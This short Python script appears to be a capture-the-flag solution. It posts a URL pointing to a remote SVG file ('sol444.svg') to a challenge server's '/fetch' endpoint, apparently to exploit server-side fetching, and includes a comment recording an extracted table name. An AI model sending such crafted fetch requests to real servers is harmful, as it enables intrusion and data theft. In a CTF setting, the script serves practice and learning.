import requests

url = "http://192.168.64.2:5000/fetch"
url = "http://nexus-security.club:8001/fetch"
# table name : _0dab7bad101846f6

payload = {
    "url": "https://raw.githubusercontent.com/Ilyeshaddad337/nexusctf/refs/heads/main/sol444.svg"
}
headers = {
    "Content-Type": "application/x-www-form-urlencoded"
}
r = requests.post(url, headers=headers, data=payload)


print(r.text)